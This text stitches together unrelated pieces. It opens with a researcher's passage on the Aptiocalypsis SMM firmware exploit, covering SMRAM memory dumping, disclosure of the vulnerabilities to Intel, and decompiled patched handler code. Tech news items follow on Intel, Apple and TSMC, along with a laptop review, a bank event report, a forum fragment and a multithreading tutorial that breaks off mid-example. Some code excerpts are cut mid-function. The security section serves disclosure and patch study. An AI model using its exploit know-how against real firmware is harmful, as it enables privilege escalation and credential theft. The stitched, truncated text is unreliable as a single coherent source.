 To make my Aptiocalypsis exploit a bit more useful as standalone firmware reverse engineering tool, I wrote some code that allows to dump physical memory contents. Here’s how to use it from command line: # python aptiocalypsis.py [<dump_address> <dump_size> [dest_file_path]] When it was started without command line, it checks whether it’s possible to exploit NvmeSmm driver vulnerability on current platform. In other case it dumps specified region of physical memory into the file or prints its hexadecimal dump into the stdout if dest_file_path argument was not specified. Using aptiocalypsys.py to dump whole SMRAM contents into the file: Having fun with Aptiocalypsis exploit. As you can see — the code works just fine. It was tested on several 6-th generation Intel NUCs with firmware version SYSKLi35.86A.0045 from 27.05.2016 (latest one at that moment). To port this exploit to any other vulnerable firmware from AMI you have to perform reverse engineering process explained in this article and add constants for your firmware version into BIOS_VERSIONS array. Aptiocalypsis exploit is the first publicly demonstrated successful attempt of breaking SMM_Code_Chk_En security feature and I need to admit that it was easy. However, I believe that it still might be useful to mitigate some other vulnerabilities, in general this security feature looks pretty sane and there’s no excuses for the firmware developers not to have its support in their products. Also, it will be interesting to know about existence of other computers that use SMM_Code_Chk_En, so, any information related to this question is welcome. Patch analysis As it was said at the beginning of the article — to try something new I decided to do responsible disclosure of four AMI and ItkSmmVars 0day vulnerabilities to Intel. Why Intel? Well, for me it’s more convenient to have a single communication point with this industry, and the platform vendor looks like the best available option so far. I sent my reports to Intel Platform Security and Incident Response Team at 15.07.2016 and after several working days and short e-mail conversation both Intel and AMI confirmed all of the security issues. Intel decided to release a single advisory INTEL-SA-00057 to cover all four vulnerabilities. Fixed firmware for my NUC of version SYSKLi35.86A.0051 was released at 10.08.2016 — not bad, especially as for the job that requires coordinated work of two different companies. So, let’s download patched firmware (I took more recent SYSKLi35.86A.0052 released at 10.09.2016) and check the code of, for example, UsbRt driver SW SMI handler: __int64 __cdecl sub_1B34(EFI_HANDLE DispatchHandle, VOID *Context, VOID *CommBuffer, UINTN *CommBufferSize)
{
    __int64 v4; // rbx@1
    VOID *SomeStruct; // rdi@1
    unsigned __int8 v6; // al@7

    v4 = qword_177E8;
    SomeStruct = *(VOID **)(qword_177E8 + 0x6D78);

    if (SomeStruct)
    {
        *(_QWORD *)(qword_177E8 + 0x6D78) = 0;
    }
    else
    {
        if (*(_BYTE *)(qword_177E8 + 8) & 0x10)
        {
            return 0;
        }

        // get pointer to the attacker controlled structure
        SomeStruct = (VOID *)*(_DWORD *)(*(unsigned int *)0x40E * 0x10 + 0x104);

        //
        // Check if it points into the SMRAM, this function call is actually
        // new one that was added in the most recent version.
        //
        if (sub_17268(SomeStruct, 0x44) < 0)
        {
            // structure address points into the SMRAM, exit
            return 0;
        }

        *(_BYTE *)(qword_177E8 + 0x71B0) = 1;
    }

    if (!SomeStruct)
    {
        return 0;
    }

    // read byte form the beginning of the structure
    v6 = *SomeStruct;
    if (!*SomeStruct)
    {
        goto LABEL_11;
    }

    // some checks to prevent array index overrun
    if (v6 >= 0x20 && v6 <= 0x38)
    {
        v6 -= 0x1F;

LABEL_11:

        //
        // Use readed byte as index to call child function which
        // address is stored in array.
        //
        off_DF0[(unsigned __int64)v6](vSomeStruct, &off_DF0, CommBuffer, CommBufferSize);
        v4 = qword_177E8;
    }

    if (!*(_QWORD *)(v4 + 0x6D78))
    {
        *(_BYTE *)(v4 + 0x71B0) = 0;
    }

    return 0;
}
 As you can see, now this function has a new call to the sub_17268() which is obviously used to verify structure pointer obtained from attacker controllable memory location. Here’s the sub_17268() code, it accepts memory address as first argument and its size as second. From function control flow we can suggest that it checks whether specified memory range overlaps any known SMRAM location: signed __int64 __cdecl sub_17268(void *Address, void *Size)
{
    unsigned __int64 v2; // r8@1
    signed __int64 result; // rax@2
    unsigned __int64 v4; // rbx@3
    EFI_SMRAM_DESCRIPTOR *v5; // r10@6
    unsigned __int64 v6; // rdx@7

    v2 = 0;

    if (SmramDescriptorCount)
    {
        v4 = Size + Address;

        if (Size + Address >= Address)
        {
            if (SmramDescriptorCount <= 0)
            {
LABEL_12:
                // ok, specified memory location is allowed
                result = 0;
            }
            else
            {
                v5 = SmramDescriptor;

                // enumerate available SMRAM descriptors
                while (1)
                {
                    v6 = v5->PhysicalSize;

                    // verify buffer address against this SMRAM region
                    if (Address < v5->PhysicalStart)
                    {
                        goto LABEL_17;

 Function sub_17268() uses array of standard EFI_SMRAM_DESCRIPTOR structures with the information about SMRAM regions stored in global variable off_17798 (I renamed it to SmramDescriptor). Other global variable off_177A0 (SmramDescriptorCount correspondingly) contains total number of known SMRAM regions. Here’s SMRAM descriptor structure definition from public EFI header files: //
// Structure describing a SMRAM region and its accessibility attributes.
//
typedef struct
{
    //
    // Designates the physical address of the SMRAM in memory. This view of memory is
    // the same as seen by I/O-based agents, for example, but it may not be the address seen

 Function sub_17268() is also being called form other locations of UsbRt driver, it seems that AMI uses it to filter attacker controllable pointers in many of child functions that might be called from SW SMI handler code: References to memory validation function. Function sub_FFC() that runs upon SMM driver load (its call is located near the driver entry point) is responsible for initialization of SMRAM regions information needed by the sub_17268(). It obtains this information in a pretty usual way: by calling GetCapabilities() function of the EFI_SMM_ACCESS2_PROTOCOL defined in UEFI specs. Array of EFI_SMRAM_DESCRIPTOR structures itself is located in System Management Mode pool allocated with SmmAllocatePool() function of the EFI_SMM_SYSTEM_TABLE2: int __fastcall sub_FFC(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable)

 Other patched drivers of the new Intel NUC firmware, NvmeSmm, SdioSmm and even ItkSmmVars have absolutely the same code to verify attacker controllable pointers against known SMRAM regions, it seems that Intel and AMI had worked on this patch together. How good is this patch? Well, it depends on what do you mean under "good". It prevents arbitrary System Management Mode code execution, so, attacker will not be able to elevate his privileges from ring 0 to ring -2 (SMM) on patched firmware versions. However, security of UEFI SMM drivers from platform firmware can affect security mechanisms of operating system that runs on this platform. In "Exploiting SMM callout vulnerabilities in Lenovo firmware" article I’ve told that SMM vulnerabilities might be used to break Windows 10 Enterprise security feature called Credential Guard — it protects domain credentials stored in the RAM even when attacker managed to get full privileges (ring 3 + ring 0 code execution) on target host. Credential Guard is implemented on the top of other Windows 10 feature called Virtual Secure Mode (VSM). VSM works as protected virtual machine (aka secure world) that runs on the top of the Hyper-V separately from host Windows 10 system and its kernel (aka normal world). VSM has its own isolated kernel mode and user mode, on Credential Guard enabled systems part of Local Security Subsystem Service (LSASS) is responsible for keeping domain credentials running as isolated user mode process inside VSM. Obviously, UEFI SMM drivers have no any clue about the hypervisor: validation of attacker controlled pointers in fixed versions of Intel and AMI drivers prohibits overwriting of SMRAM region only, so, attacker still can write various constant values into the memory that belongs to the Hyper-V. It might be used for escaping from normal world to secure world and breaking Windows Credential Guard and others VSM powered security features. There’s a great whitepaper "Analysis of the attack surface of Windows 10 virtualization based security" by Rafal Wojtczuk, check it out for more detailed information about attacks on Credential Guard. It’s also necessary to clarify that described attack can’t be performed from regular virtualized guest domains of the Hyper-V because they prohibit access to 0xB2 I/O port that is needed to fire vulnerable SW SMI handlers. Writing proper security fixes for broken UEFI SMM drivers is actually more complicated than it looks, I hope that Intel and AMI will find some way to make UsbRt, NvmeSmm, SdioSmm and ItkSmmVars code more secure to prevent bypassing Windows 10 Virtual Secure Mode. For example, it’s possible to use buffers with preallocated physical addresses for SW SMI handlers input, or move these buffers below first megabyte of physical memory space. Source code of Aptiocalipsys exploit is available on its GitHub repository, at this moment it seems that Intel is the only one OEM company which released advisory and fixes for these vulnerabilities. Probably, in some future we’ll see information about vulnerable products from other vendors.

Quietly Delays 3DXPoint Memory Modules Intel's next server processors won't support 3DXPoint memory modules. Ashraf Eassa (TMFChipFool) Oct 22, 2016 at 11:22AM Image source: Intel.  For quite a while, chip giant Intel (NASDAQ:INTC) has been talking up a next-generation non-volatile memory technology known as 3DXPoint. The technology is billed as an entirely new class of memory -- faster and more durable than traditional NAND flash memory while much cheaper than DRAM. At Intel's 2015 investor meeting, the company claimed that the total addressable market, or TAM, for 3DXPoint memory modules (that is, 3DXPoint being used as a substitute for DRAM rather than as a substitute for NAND flash as part of a storage drive) could be worth approximately $34 billion by 2020. Intel had previously said that these 3DXPoint memory modules would be supported on a "future Intel Xeon processor." Based on the leaks around Intel's upcoming Purley server platform, it was expected that the future processor that Intel was talking about was Skylake-EP, a product that's slated to launch in the first half of 2017. However, on Intel's most recent earnings call, CEO Brian Krzanich indicated that this wouldn't be the case. 3DXPoint memory modules only for second-gen Purley Whenever Intel releases a server platform, it usually supports that same basic platform for two processor generations. It usually takes anywhere from a year to a year and a half for Intel to come out with new processor generations, so in practice one can expect an Intel server platform to remain current for about three years before being replaced. With that in mind, it's worth looking at what Krzanich had to say about Purley and 3DXPoint memory module support (transcript from Seeking Alpha): On the Purley platform we're actually starting to sample those products already to some of the leading-edge customers. And they're seeing not only just an overall TCO performance advantage that we typically see with each one of these but this also continues our integration of things like the omni-path fabric, it has more integration of the silicon photonics so it's still the adjacency functions that are quite strong, and they will get more and better as we go through each one of these. There will be a second generation of Purley that includes 3DXPoint. According to this, the "future Xeon processor" that will support 3DXPoint memory modules will not be the upcoming Skylake-EP, but instead its successor, known as Cannonlake-EP. When will Intel start selling these 3DXPoint memory modules? If Intel's upcoming 3DXPoint memory modules require Cannonlake-EP to work, then investors should realistically expect that Intel won't be selling those modules until either late 2018 or in the first half of 2019. I'd be pleasantly surprised if it were the former, as I'm expecting the latter. This suggests that any revenue contribution from these memory modules on Intel's part probably won't be seen until that time. What does this mean for investors? At the end of the day, Intel's data-center group brings in most of its revenue from the sale of processors and related chipset components, which Intel refers to as "platform" products. Last quarter, just over 8% of its data-center revenue came from non-platform products. The best way to think of technologies like 3DXPoint memory modules, silicon photonics, and these other non-platform products that Intel talks about is as "nice to have" technologies. Obviously, investors should welcome every last bit of profitable revenue growth with open arms, but the core of the business has been and will continue to be sales of platform components. If the platforms continue to do well, Intel's overall data-center business should do well -- robust non-platform sales in this case would serve as a cherry on top. If platform sales disappoint, then it's unlikely that any growth from the non-platform components, like 3DXPoint memory modules, will generate enough revenue to ultimately matter.

No major problems ever. However, i am starting to see a limit. Not because of the hardware but because of the OS. The fastest speed ram config, video card configs and some awesome motherboard features don't work. SLI is one. not being able to use built in network solution forces the use of a pci slot. you are partly restricted to macOS supported parts. I am getting close to go PC. But will probably still get the new mac pro if it's updates because i do need it on set.     #8   Marcus Friedlander View Profile View Forum Posts Private Message Senior Member Join Date Jun 2014 Location Los Angeles Posts 665 10-23-2016, 10:23 AM Very interested in this thread!

Fine performance for category. Partially rugged design. Cons Display is a bit small. A little bulky for an ultraportable. No USB-C port. Fairly short warranty. Bottom Line A dual-battery design for record-breaking battery life, a comfortable keyboard, and a good price combine to make the Lenovo ThinkPad X260 one of the most compelling business ultraportables you can buy. By Matthew Murray Lenovo is not much of a chance-taker when it comes to business laptops; the company knows what its customers want, and is generally happy to provide it with a minimum of filigree. That does not, however, mean that they don't maximize every single element of those machines. Case in point: the ThinkPad X260 (starts at $849; $1,344 as tested). Inside and out, it looks like a typical, unremarkable Lenovo ultraportable, marching nearly in lockstep with its predecessors, the ThinkPad X250 and the ThinkPad X240. But a few subtle changes make a big difference for professional customers with specific needs, and in turn deem the ThinkPad X260 one of the best laptops of its type. //Compare Similar Products Compare Asus ZenBook 3 (UX390UA)   %displayPrice%%seller% see it Apple MacBook Air 13-Inch (2015)   %displayPrice%%seller% see it Apple MacBook (2016)   %displayPrice%%seller% see it Lenovo ThinkPad X1 Carbon (4th Gen, 2016)   %displayPrice%%seller% see it New Razer Blade Stealth (Late 2016)   %displayPrice%%seller% see it Dell XPS 13 Touch (2016)   %displayPrice%%seller% see it Apple MacBook Pro 13-inch (Retina Display)   %displayPrice%%seller% see it Lenovo IdeaPad 100S-11 (80R2003XUS)   %displayPrice%%seller% see it Lenovo ThinkPad Yoga 260   %displayPrice%%seller% see it HP EliteBook Folio G1 (1080p HD)   %displayPrice%%seller% see it Dell Latitude 13 7000 (7370)   %displayPrice%%seller% see it Design and Features Although the ThinkPad X260 technically meets our definition of ultraportable, it's far from the thinnest and lightest laptop you can find. Measuring 0.8 by 12.03 by 8.21 inches (HWD) and weighing 3.03 pounds, it's far thicker than, say, the Asus ZenBook 3 (UX390UA), the New Razer Blade Stealth, the Apple MacBook Air, or even Lenovo's own ThinkPad X1 Carbon. And though it's not heavy, it's a shade too substantial to be the kind of thing you toss in your briefcase and forget about. But if you do throw in there (or pretty much anywhere else), it will have some degree of protection, as it's MIL-SPEC certified for ruggedness, with particular guard against hazards like temperature, humidity, dust, and more. View All 7 Photos in Gallery One additional benefit of its size comes in terms of the port selection, which is on the generous side for laptops of this type these days. On the left edge are the power jack, an HDMI port (replacing the VGA port that was still in place on last year's ThinkPad X250), a Mini DisplayPort connector, and two USB 3.0 ports (note that they're colored black, rather than the blue that usually denotes this faster standard). A security lock slot, an Ethernet port and an SD card slot (neither of which you'll find on the ThinkPad X1 Carbon), a third USB 3.0 port (with fast charging capability), and a headset jack are on the right; if you select the optional wireless modem at checkout time, the slot for that is there, too. The one major port missing: USB-C, which you'll find on many ultrathin laptops and would definitely give the X260 a next-generation boost of connectivity. The rest of the design is standard Lenovo stuff, with form following well behind function; the X260's design is almost identical to that of the X250, the biggest outward change being the shift to the newer, more contemporary Lenovo logo in the display's lower-left corner. As a whole, the X260 is quite squarish, and just about everything is black, the exceptions being the silver ThinkPad logos on the lid and the keyboard deck, the red dot over the "i" in those logos (the one on the cover lights up), the white key labels, the green light on the Power button in the upper-right corner of the keyboard deck when the laptop is turned on, a hint of red lining on the touchpad's buttons, and the de rigueur crimson TrackPoint stick located in the center of the keyboard. Even so, nothing stands out or distracts you from your work, which is likely the intent. The keyboard is one fervent typists will appreciate, with glossy, slightly rounded keys that have an excellent amount of travel. (It doesn't have dedicated media keys, and the function key row is half-height at most, but these will hardly impediments for most business users.) The touchpad is smooth but not overly slick, and its buttons (rectangular left- click and right-click, and the trapezoidal scroll button between them) are firm without being stiff or sticky. A fingerprint reader, good for making use of the Windows Hello functionality in the Windows 10 Pro operating system, is on the bottom right of the keyboard deck. Like the ThinkPad X1 Carbon, the ThinkPad X260 has a 12.5-inch antiglare display with In-Plane Switching technology for colors pop and wider viewing angles; unlike it, the X260's display has a resolution of 1,920 by 1,080 rather than 2,560 by 1,440. It looks terrific, regardless: bright and crisp, though the fairly wide bezel (about 0.75 inch on the top and 0.6 inch on the sides) makes the screen, which is already not huge, look even smaller. (Perhaps realizing this, Lenovo ships the X260 with 125-percent magnification enabled in Windows.) A 720p webcam may be found in the top bezel. The speakers put out a decent amount of volume, though their bass response is on the anemic side. As tends to be the case with Lenovo laptops, you have a lot of configuration options with the ThinkPad X260. For many users, a collection similar to that of our review unit will be sufficient: a 2.4GHz Intel Core i5-6300U processor (with integrated Intel HD Graphics 520), 8GB of RAM, and a 256GB solid-state drive (SSD). Wireless connectivity comes by way of 802.11ac Wi-Fi and Bluetooth. Lenovo covers the X260 with a one-year service warranty, which is on the light side for a business laptop. Performance In our tests, the ThinkPad X260 proved a deft, if not spectacular, performer at productivity-oriented tasks. Its scores of 2,995 on our general-purpose PCMark 8 Work Conventional test and 313 on our CineBench rendering test, and its times of 2 minutes, 21 seconds, to finish our HandBrake video encoding trial and 4:35 to apply a large number of filters to an image in Photoshop, placed it ahead of most of its competitors. It came out ahead of the 2016 Apple MacBook across the board; except at PCMark, ahead of the 1080p HP EliteBook Folio G1; and, except at Photoshop, ahead of the ThinkPad X1 Carbon. See How We Test Laptops For the record, the ThinkPad X260 completed our Photoshop test quicker than the just-released Kaby Lake–based ZenBook 3, but it didn't surpass the Razer Blade Stealth or HP Spectre x360 13-w023dx at anything. Intel's new processors are formidable components you'll want to consider for business applications once they become more widely available, but the ThinkPad X260 is still well equipped. Note, though, you shouldn't try to sneak in much 3D gaming on the ThinkPad X260. It should be able to survive basic casual titles, but unless you're willing to turn the resolution and the details way down, you're not going to see good frame rates from the integrated Intel graphics system, as our gaming tests proved. Stick with work. The good news? You'll be able to work really a long time on the ThinkPad X260. (Okay, maybe that's not good news.) Either way you look at it, battery life is outstanding. Though this is in part because it pairs a sealed interior battery with a removable, hot-swappable external one, what matters in this case are the numbers: It lasted 10 hours, 45 minutes on our rundown test with its default 24Wh battery installed. And when you swap that battery for the 72Wh replacement cell (included with our review unit, but only another $15 at checkout), its uptime leaps to a breathtaking 23:08—over 6 hours more than we saw with our reigning champ, the 13-inch MacBook Air. The downside of this is that the 72Wh battery is noticeably larger, and adds about a half-inch to the laptop's height when installed. (It only adds 0.38 pound to the weight.) But if you need the extra time, it's worth this minor annoyance. Conclusions If you want a truly eye-popping ultraportable, you can find it in releases like the Asus ZenBook 3 or the Apple MacBook, but those machines require you to make some sacrifices in terms of usability, configurability, and durability that are not ideal for a business environment. For business, a sterling screen and a comfortable keyboard are musts, of course, and, like the ThinkPad X1 Carbon and the HP EliteBook Folio G1, this laptop has them. And its removable battery can result in legitimately astounding uptime. Yes, you have to forego the Carbon's higher-resolution screen and the EliteBook Folio's shinier looks, but the other trade-offs and the money you save (about $200 for the Lenovo, $120 for the HP) cushion that blow. So much so, in fact, that the ThinkPad X260 is our latest Editors' Choice for business ultraportables. Back to top PCMag may earn affiliate commissions from the shopping links included on this page.

In line with long-standing rumors, Kuo believes the highlight of the event will be a redesigned MacBook Pro in both 13-inch and 15-inch sizes, adopting an OLED touch bar and Touch ID sensor, USB-C, Thunderbolt 3, and the same butterfly keyboard design introduced on the MacBook in 2015. Kuo also adds several new tidbits to the rumor mix: Our new predictions also include: (1) Intel’s (US) Skylake processor; (2) the same panel resolution but better display quality and energy efficiency thanks to an oxide panel; (3) a new option of 2TB SSD storage capacity; (4) adoption of a similar processor as Apple Watch to control the OLED touch bar more energy-efficiently in the new MacBook Pro models; and (5) a Type-C & MagSafe-like adapter rolled out by Apple or a third-party supplier, given positive reviews for the MagSafe charging design.Beyond the MacBook Pro, Kuo says Apple will also be introducing a "13-inch MacBook," a claim he has shared previously. Rather than being a slightly larger version of the current 12-inch MacBook, however, this is likely to be a MacBook Air, which would align with other rumors claiming that only the 13-inch MacBook Air will be seeing an update with new USB-C ports. On the desktop side, rumors have indicated that Apple is working on updated iMac models with discrete AMD graphics options, as well as a new standalone external 5K display, but Kuo says those products will not be ready until the first half of next year. It is still possible, however, that Apple could announce them at next week's event. We also expect Apple to launch new iMacs (21.5-inch and 27-inch) and Cinema Display (27-inch) in mid- 1H17. We cannot say for certain whether Apple will announce the new iMacs and Cinema Display on October 27 as the shipping schedule is not imminent.Apple's event is being held at the company's Cupertino campus and kicks off at 10:00 AM Pacific Time on Thursday. MacRumors will have full coverage both here on the site and on our @MacRumorsLive Twitter account, and Apple will be offering a live video stream of the event.

The event which held recently in Ikeja, Lagos, featured an idea pitching competition involving five young business enterprises with Greenville Organic Foods, an agro-allied company emerging the winner of a N4 million business solution from Microsoft . Addressing over 200 participants at the event tagged “Accelerate Your Business’’, Head, Emerging Businesses, Diamond Bank Plc, Njideka Esomeju stated that most Micro Small and Medium Enterprises (MSME) were saddled with the problem of Access to Finance, Access to Market and Access to skills, pointing out that 80% of over 35 million business ventures in Nigeria fall under the MSME category.  Njideka revealed that Diamond Bank was focused on going beyond banking to take people to the next level in life. In her words, “At Diamond Bank, we back our passion with action as we continually seek to deepen inclusive financing in all sectors across the country’’. Sharing her wealth of knowledge on small businesses with the attendants, she stated that most start-ups were designed with borrowed business plans and consequently wired to fail from the start.  Njideka reiterated that Diamond Bank had embraced the challenge of serving small and growing businesses by setting up a focused unit to drive MSME initiatives. “The Bank’s Emerging Business Propositions team recognises that finance is not the only need of small and growing businesses, which is why we have developed interventions that go beyond the traditional services offered by most banks.”  Our Capacity Building, Access to Markets and Access to Finance offerings are specifically designed to assist businesses realise their growth potential”, said Njideka.   She pointed out that the proposition comprised of special accounts for different vocations and practices ranging from schools to agriculture, entertainment and medical practice all tailored to suit industry needs. She also disclosed that the theme for the year at Diamond Bank was focused on the digital revolution and the Bank had designed revolutionary tools and platforms in line with this drive, adding,  “The Diamond Mobile app, Online Loan application platform and the Diamond E-susu scheme are some of the digital products created to give our customers the competitive edge”.  She urged the attendants to utilise the Bank’s SME club events where it partners with relevant industry stakeholders to organise events bringing together people within an industry to create value chain networking. Head, SME Customers’ Marketing, Microsoft Nigeria, Mr. Adeniyi Adebote , in his address said; MSME’s have to leverage technology to deepen consumption in their various industries. He further stated that Microsoft was driven to empower each individual to achieve more as reflected in Microsoft 365 which had been developed to narrow the generational gap and enable people to grow their businesses innovatively he said.

Speaking at the company’s annual sports day in Hsinchu, TSMC chairman Morris Chang (張忠謀) said that the company will distribute the bonuses as a reward for employees’ contributions to the firm. More than 36,000 employees who started working for TSMC before May 31 will receive NT$12,000 bonuses, Chang said. Eligible employees include production line workers, engineers and technicians, as well as administrative personnel. TSMC posted a record profit of NT$96.76 billion in the third quarter, up 33.4 percent from the previous quarter and 28.4 percent from a year earlier. The company said it is counting on a pool of talented personnel and high-end technologies to stay competitive in the global market. Chang said TSMC will continue to focus on its contract chipmaking business and defend its No. 1 position amid intensifying competition from rival companies such as Intel Corp, Samsung Electronics Co and some Chinese firms. Chang said he has faith in TSMC’s efforts to develop the 10-nanometer process technology, which Samsung has also been developing. He said that TSMC is expected to surpass Samsung in the 10-nanometer process development by moving more quickly than the South Korean firm. TSMC last year launched the commercial production of chips using the 16-nanometer process technology and is to begin mass production of chips based on the 10-nanometer process technology in the first quarter of next year. The company is planning to start commercial production of chips by adopting the more advanced 7-nanometer process technology in the first quarter of 2018. Analysts said TSMC might dominate the global 7-nanometer market in 2018, increasing the odds that it will secure all of the orders placed by Apple Inc for new iPhone models to be unveiled that year. Chang said TSMC has been riding a wave of solid demand in the global smartphone market, adding that the company’s shipments could peak in the second and third quarters of next year after a slow season in the first quarter. As for China’s move to develop its own contract chipmaking industry by expanding production capacity, Chang said TSMC expects the competition to intensify, but due to its strong lead in advanced technology development, it will continue to dominate the global market. Meanwhile, Chang said the global economy is expected to improve next year, even though it is haunted by uncertainty from the UK’s exit from the EU, a possible rate hike by the US Federal Reserve and a slowdown in China’s economy. The IMF earlier this month forecast that the global economy will grow 3.4 percent next year after an estimated increase of 3.1 percent this year. This story has been viewed 1662 times.

Skip to content Tech Take Software technology explained – Alok Ashtikar Menu About Symmetric multi-processing, multi-threading and synchronisation explained alokashtikarOctober 13, 2016October 13, 2016Uncategorized Post navigation Previous Nowadays we have computers and phones equipped with multi-core processors. These computers can actually perform multiple computations in parallel. All the cores or processors share the same memory (RAM) and IO bus. The operating system is able to schedule work on different cores simultaneously. This is called symmetric multi processing (SMP). Programs take advantage of SMP. With the help of the operating system, the programs distribute computation to multiple cores, and bring down the overall execution time by a huge factor. The operating system, and programming language features play a huge role in making SMP available to programmers. The intension of this post is to delve deep and understand how the language features, operating system and hardware architecture enables use of SMP in applications. If one is already well versed in multi-threaded application programming, he/she may skip directly to “Understanding SMP hardware architecture“. Multi-threaded applications Each task that a process performs is a series of operations. The processing of these series of operations is called execution of a thread. A process can distribute tasks to multiple threads. It creates threads by calling a function exposed by the operating system. The operating system creates, manages and schedules threads. It does this for all the applications and services running on it. The operating system usually ends up creating a much larger number of threads than the number of cores on the computer. To be able to handle so many threads, each core has to serve multiple threads. The operating system assigns a thread to be executed on a core for some time, and then uses the same core for another thread. This process is called scheduling, and the duration for which a thread is assigned to a processor / core is called a time slice. When the time slice for a thread is over, it is pre-empted (taken off the processor) and put aside for scheduling. Whenever the thread gets another time slice for itself, it resumes from where it had been pre-empted in the last run. This post will cover the issues related to a single process using multiple threads. Applications use multiple threads mainly to: decrease effective time needed for huge computations increase responsiveness to external events such as: user input messages from other systems Such applications are called multi-threaded applications. Programming multi-threaded applications is considered challenging and rightly so. Many language features and operating system facilities try to abstract the details to simplify writing multi-threaded applications. Though it has helped application programmers, it also has a flip side: Due to improper use of these features and facilities, a large number of applications have turned out to perform worse than expected. Quite often, lack of true understanding has led to: undefined behaviour (crashes / memory corruption) hung processes (due to deadlocks) Sharing memory between threads The main reason for all the complexity in multi-threaded applications is that, the same data / memory location gets shared between multiple threads. Let us take a very simple task of incrementing a counter. Whenever an event occurs, we need to increment the counter. A simplified series of operations needed for incrementing a counter is as follows: Read the current value from the counter’s memory location Add 1 to the current value Write the new value to the counter’s memory location Let us say two events happen, and they are processed by our application in parallel. The process being multi-threaded, schedules the task of incrementing the counters on two different threads. The threads run on different processors simultaneously. Both of the threads execute step 1 above and see the value, say 998. They then add 1 to it and the new value happens to be 999. Then both want to write 999 to the memory location. Regardless of who writes first, in the end it would be 999 in the counter’s memory location. So instead of having 1000, we have 999. This is called a race, and it can be avoided using synchronisation features provided by the language or the operating system facilities. Synchronisation One of the synchronisation features is mutex (mutual exclusion). A thread locks a mutex, and until the thread unlocks it, no other thread can lock it. A mutex is typically used to protect a variable from data races. To avoid race in the counter example, lock a mutex before the read operation, and unlock after the write operation. Thus any one of the two threads gets to lock the mutex first. The other thread remains blocked. Once the counter is updated and written back, the first thread unlocks the mutex. This is when the second thread gets to lock the mutex and is able to proceed. By this time the counter is already updated by the first thread, hence the read by the second thread gets the incremented value. This provides the needed consistent behaviour. Programmers have to follow a discipline of using mutexes whenever they have to use variables that are shared between threads. Due to the simplicity of the counter example, one may be led into believing that using mutexes around all shared variables will solve all multi-threading related issues. There are two kinds of problems that arise: The process slows down. The process hangs. Slow down: If two threads are contending to get a lock on a mutex, the operating system or language makes sure that only one of them gets it. The other thread blocks. This causes only one thread to effectively proceed. In-spite of having multiple cores / processors on the system, it behaves as if it were single threaded. In fact if the application is single threaded, it could have avoided acquiring locks, and thus could have been faster! After all acquiring lock is some overhead even if there are no contending threads (it is an operation after all). Hence indiscriminately sharing all data between threads and thereby protecting it with mutexes would lead to slow down of the system. The process hangs: Let us say there are two variables which are protected using different mutexes. Now suppose there are two threads operating on the variables. The example below illustrates how two seemingly un-related functions get blocked indefinitely. thread 1 (function trying a swap) lock obj1
lock obj2 (blocked)
...
swap obj1 obj2
...
...
unlock obj2
unlock obj1 thread 2 (function incrementing objects) lock obj2
lock obj1 (blocked)
...
obj1 = obj1 + 1
obj2 = obj2 + 1
...
unlock obj1
unlock obj2 This is called a deadlock. This is an over simplification of code causing deadlocks. Usually industrial code is very complex, and huge. It is becomes extremely difficult to find deadlocks until they actually occur! Different synchronisation mechanisms There are features like Mutexes, Semaphores and Condition Variables and even more higher level of synchronisation techniques provided by languages and operating systems. A well written program will strive to improve through put of the program. It would parallelise functions using multiple threads. With locks being used while sharing memory between threads, it becomes important to acquire locks only when needed and unlock immediately after the need is over. Acquiring a lock is costly in a high performance system. To further increase the performance of the system, a programmer can make use of hardware instructions exposed by languages like C/C++. The programmer avoids locking a mutex. This completely alters the design of the system. The technique is called lockless programming. It is considered very advanced, and is best avoided by application developers. This post attempts to explain the basics of lockless programming. Lockless programming techniques are used by device driver writers, compiler writers. It is also used in ultra low-latency systems and in a few operating system kernel modules. From an application developer’s perspective, the only benefit of lockless programming is that there is no chance of a deadlock! Understanding SMP hardware architecture Modern hardware architectures have multiple cores / processors and often 3 levels of caches. The sample image below is a 2 level cache taken from Intel’s website, just to illustrate. To manipulate a variable in a thread running on say Core 0, it has to fetch the value of the variable from the system memory. The Core 0 actually manipulates the value in a register and stores the new value in the location of the variable. In essence the Core 0 is actually operating on a copy of the variable, not directly on the system memory. The steps needed for incrementing a counter: 1. load counter from system memory in C2 (C2 is location in L2 Cache)
2. load C1 from C2 (C1 is location in L1 Cache)
3. load R1 from C1 (R1 is a register in the processor)
4. R1 = R1 + 1
5. store R1 to C1
6. store C1 to C2
7. store C2 to location of counter in system memory The reason for these levels of caches is higher performance. It is much faster to load a value from L1 cache into the register compared to loading from L2 cache. Similarly the access to system memory is very slow compared to the L2 cache. Hence, the processors predict the data they might need, and pre-fetch those into the caches. Sometimes the predictions go wrong, so it has to drop the existing contents in the cache, and get the right ones. This is called a cache miss. In the example above, R1 could be the register eax of the x86 architecture. This register is 32 bits. So even if the counter happened to be an unsigned char, that is, just one byte (8 bits), R1 would load 32 bits. The remaining unneeded 24 bits next to the counter therefore get loaded in the register. Please bear this in mind, as the implication of this is elaborated later on. Optimisation by the processor Consider the following multiple lines which are unrelated, eg: 1. x = x+1
2. y = 100
3. pi = 3.14 It would not matter in which order the lines are executed. The processor exploits this and depending upon the proximity of the variables in the caches, executes the one which are closer first. This is called memory ordering. Quite often it even predicts conditional statements as well: 1. if(some_bool == true)
2.     x = x+1
3. else
4.     y = y+1 Whenever it predicts which direction the code is likely to flow, it would initiate executing based on the prediction even before the condition is evaluated. This is called branch prediction. This link provides the details: Intel processor’s branch prediction. There is a heavy cost associated with mis-prediction here, as a lot of work done by the processor needs to be thrown and other branch needs to be executed. This aspect is not being discussed / delved-into in this post. Optimisations by the compiler Even the compilers are intelligent enough to optimise the execution. The compilers quite often provide hints to CPU through instructions. Branch predictions can be influenced by developers by using appropriate macros in the code. The developer actually provides hints to the CPU on the likely result of a condition. The compilers often optimise poorly written code to get faster executions. (The code could be stylistically good, however from the processors perspective it could be poor.) Various levels of optimisations can be turned on while building the code. Sometimes these optimisations can become very aggressive in reordering instructions and cause various kinds of issues. Deeper understanding of data races Let us consider the incrementing counter example from the processor’s point of view again. If two threads were running the same code simultaneously on two separate cores we could easily end up in a situation where thread1 is executing step 5 above, while thread 2 is executing step 4. Thread 2 would have taken an older value of counter in the register R1. Thus we end up with a race, similar in nature as “Sharing memory between threads” section above. Another kind of race Let us now consider two seemingly unrelated lines of code: Thread 1:
1. x = result_of_this_function_call()
